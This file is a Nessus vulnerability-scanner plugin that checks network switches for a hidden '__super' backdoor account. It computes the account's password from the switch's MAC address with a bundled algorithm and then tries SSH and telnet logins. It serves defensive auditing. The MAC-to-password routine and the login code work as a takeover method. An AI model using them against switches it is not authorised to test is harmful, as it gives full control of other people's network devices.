#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49217);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2017/04/25 14:28:28 $");

  script_bugtraq_id(42947);
  script_osvdb_id(68260);
  script_xref(name:"EDB-ID", value:"14875");

  script_name(english:"Multiple Switch Vendors '__super' Account Backdoor");
  script_summary(english:"Tries to login as __super with a pw based on the MAC");

  script_set_attribute(
    attribute:"synopsis",
    value:
"It is possible to log on the remote network switch with a
default password."
  );
  script_set_attribute(
    attribute:"description",
    value:
"Nessus was able to log into the remote host as the '__super' user
and a password based on the switch's MAC address.  This is likely
a built-in account that cannot be disabled and whose password
cannot be changed.

A remote attacker with knowledge of this switch's MAC address could
exploit this by logging in and gaining complete control of the
device."
  );
  script_set_attribute(attribute:"see_also", value:"https://har2009.org/program/events/103.en.html");
  script_set_attribute(attribute:"see_also", value:"http://www.vettebak.nl/hak/");
  script_set_attribute(
    attribute:"solution",
    value:
"There is no known solution at this time.  Restrict access to
this device."
  );
  script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "ssh_detect.nasl", "snmp_ifaces.nasl", "ifconfig_mac.nasl");
  script_require_ports("Services/ssh", 22, "Services/telnet", 23);
  script_exclude_keys("global_settings/supplied_logins_only");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");
include("ssh_func.inc");
include("telnet_func.inc");

if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);


LOGIN_SUCCESS = 0;
LOGIN_FAILED = -1;
PORT_CLOSED = -2;
CONNECTION_FAILED = -3;
NO_PROMPT = -4;
NO_RESPONSE = -5;


function get_error_msg(code, port)
{
  if (code == LOGIN_FAILED)
    return 'The login attempt on port '+port+' failed.';
  else if (code == PORT_CLOSED)
    return 'Port '+port+' is not open.';
  else if (code == CONNECTION_FAILED)
    return 'Failed to open a socket on port '+port+'.';
  else if (code == NO_PROMPT)
    return 'Unable to get telnet prompt from port '+port+'.';
  else if (code == NO_RESPONSE)
    return 'The service on port '+port+' failed to respond.';
  else
    return 'Unexpected error on port '+port+'.';
}

function check_ssh(port, login, password)
{
  local_var soc, res, line, payload, remote_channel;
  if (!get_port_state(port)) return PORT_CLOSED;

  _ssh_socket = open_sock_tcp(port);
  if ( !_ssh_socket ) return CONNECTION_FAILED;

  res = ssh_login(login:login, password:password);

  if (res == LOGIN_SUCCESS)
  {
    # code taken from default_account.inc
    #
    # Some SSH servers do not fully respect the SSH protocol - they
    # claim that password authentication succeeded, but then
    # they'll refuse any other command. The workaround here is to
    # open a SSH, as if we wanted to create an interactive session.
    #
    # Note that we do not use ssh_open_channel() but a stripped down version.
    #
    payload = putstring(buffer:"session") + raw_int32(i:1) + raw_int32(i:32768) + raw_int32(i:32768);
    send_ssh_packet(payload:payload, code:raw_int8(i:90));
    payload = recv_ssh_packet();
    if ( !isnull(payload) )
    {
      # Fix for tectia AIX
      if (ord(payload[0]) == 95)
      {
        payload = getstring(buffer:payload, pos:9);
        payload = recv_ssh_packet();
      }
      if ( !isnull(payload) && ord(payload[0]) == 91 )
      {
        remote_channel = ntol(buffer:payload, begin:5);
        payload = raw_int32(i:remote_channel) + putstring(buffer:"pty-req") + raw_int8(i:0) +
        putstring(buffer:"vt100") + raw_int32(i:80) + raw_int32(i:24) + raw_int32(i:640) + raw_int32(i:480) +
        putstring(buffer:
                             raw_int8(i:53) + raw_int32(i:0) +
                             raw_int8(i:72) + raw_int32(i:0) +
                             raw_int8(i:0));

        # SSH_MSG_CHANNEL_REQUEST == 98
        send_ssh_packet(payload:payload, code:raw_int8(i:98));
        payload = raw_int32(i:remote_channel) + putstring(buffer:"shell") + raw_int8(i:0) ;
        # SSH_MSG_CHANNEL_REQUEST == 98
        send_ssh_packet(payload:payload, code:raw_int8(i:98));
        payload = recv_ssh_packet();
        while(!isnull(payload) && ((ord(payload[0]) == 93) || (ord(payload[0]) == 95) || (ord(payload[0])  == 98)))   payload = recv_ssh_packet();
        if ( ord(payload[0]) == 94 )
        {
          payload = getstring(buffer:payload, pos:5);
          if ( "invalid login" >!< payload )  # Infoblox
          {
            ssh_close_connection();
            return LOGIN_SUCCESS;
          }
        }
      }
    }
  }

  ssh_close_connection();

  return LOGIN_FAILED;
}

function check_telnet(port, login, password)
{
  local_var soc, res, line;
  if (!get_port_state(port)) return PORT_CLOSED;

  soc = open_sock_tcp(port);
  if(!soc) return CONNECTION_FAILED;

  res = telnet_negotiate(socket:soc);
  res += recv_until(socket:soc, pattern:"(name|ogin):");
  if (!res) return NO_PROMPT;

  send(socket:soc, data:login + '\r\n');
  res = recv_until(socket:soc, pattern:"word:");
  if (isnull(res))
  {
    close(soc);
    return NO_RESPONSE;
  }

  send(socket:soc, data:password + '\r\n');
  res = recv(socket:soc, length:256);
  close(soc);

  if (isnull(res)) return NO_RESPONSE;

  if (
    'Menu options' >< res ||  # 3com
    'Console#' >< res         # Dell
  ) return LOGIN_SUCCESS;
  else return LOGIN_FAILED;
}

# convert a hex string ('ff') to an int (0xff)
function hex2raw2()
{
  local_var s, i, j, ret, l;
  s = _FCT_ANON_ARGS[0];

  if (strlen(s) == 1) s = '0' + s;
  l = strlen(s);
  ret = NULL;
  for(i=0;i<l;i+=2)
  {
    if(ord(s[i]) >= ord("0") && ord(s[i]) <= ord("9"))
      j = int(s[i]);
    else
      j = int((ord(s[i]) - ord("a")) + 10);
    j *= 16;
    if(ord(s[i+1]) >= ord("0") && ord(s[i+1]) <= ord("9"))
      j += int(s[i+1]);
    else
      j += int((ord(s[i+1]) - ord("a")) + 10);
    ret += raw_string(j);
  }
  return ret;
}

function translate_char()
{
  local_var char;
  char = _FCT_ANON_ARGS[0];

  char = char % 0x4b;

  if (char <= 9 || (char > 0x10 && char < 0x2a) || char > 0x30)
    return mkbyte(char + 0x30);
  else
    return '!';
}

function mac_to_pw()
{
  local_var mac, mac_list, i, pw, char;
  mac = _FCT_ANON_ARGS[0];
  pw = '';

  mac_list = split(mac, sep:':', keep:FALSE);
  for (i = 0; i < 6; i++)
  {
    mac_list[i] = hex2raw2(mac_list[i]);
    mac_list[i] = getbyte(blob:mac_list[i], pos:0);
  }

  for (i = 0; i < 5; i++)
  {
    char = mac_list[i] + mac_list[i + 1];
    pw += translate_char(char);
  }

  for (i = 0; i < 3; i++)
  {
    char = mac_list[i] + mac_list[i + 1] + 0xf;
    pw += translate_char(char);
  }

  return pw;
}


#
# execution begins here
#

macs = make_list();

arp_mac = get_kb_item('ARP/mac_addr');
if (arp_mac) macs = make_list(macs, tolower(arp_mac));

snmp_macs = get_kb_list('SNMP/ifPhysAddress/*');
if (snmp_macs)
{
  foreach snmp_mac (make_list(snmp_macs))
    macs = make_list(macs, tolower(snmp_mac));
}

ifconfig_macs = get_kb_list('Host/ifconfig/mac_addr');
if (ifconfig_macs)
{
  foreach ifconfig_mac (make_list(ifconfig_macs))
    macs = make_list(macs, tolower(ifconfig_mac));
}

if (max_index(macs) == 0) exit(1, 'Unable to obtain MAC address.');

user = '__super';
macs = list_uniq(macs);
passwords = make_list();
errors = NULL;

foreach mac (macs)
  passwords = make_list(passwords, mac_to_pw(mac));

# First, try SSH
ssh_ports = get_kb_list('Services/ssh');
if (ssh_ports) ssh_ports = make_list(ssh_ports);
else ssh_ports = make_list(22);

foreach port (ssh_ports)
{
  # check if the server appears to authenticate anything
  res = check_ssh(port:port, login:'__user', password:rand_str(length:8));
  if (res == LOGIN_SUCCESS) continue;

  foreach pass (passwords)
  {
    ret = check_ssh(port:port, login:user, password:pass);

    if (ret == LOGIN_SUCCESS)
    {
      if (report_verbosity > 0)
      {
        report =
          '\n  Username : ' + user +
          '\n  Password : ' + pass + '\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
    else if (ret != LOGIN_FAILED)
      errors += get_error_msg(code:ret, port:port) + ' ';
  }
}

# Next, try telnet
telnet_ports = get_kb_list('Services/telnet');
if (telnet_ports) telnet_ports = make_list(telnet_ports);
else telnet_ports = make_list(23);

foreach port (telnet_ports)
{
  # check if the server appears to authenticate anything
  res = check_telnet(port:port, login:'__user', password:rand_str(length:8));
  if (res == LOGIN_SUCCESS) continue;

  foreach pass (passwords)
  {
    ret = check_telnet(port:port, login:user, password:pass);

    if (ret == LOGIN_SUCCESS)
    {
      if (report_verbosity > 0)
      {
        report =
          '\n  Username : ' + user +
          '\n  Password : ' + pass + '\n';
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
      exit(0);
    }
    else if (ret != LOGIN_FAILED)
      errors += get_error_msg(code:ret, port:port) + ' ';
  }
}

if (isnull(errors))
  audit(AUDIT_HOST_NOT, 'affected');
else
  exit(1, errors);

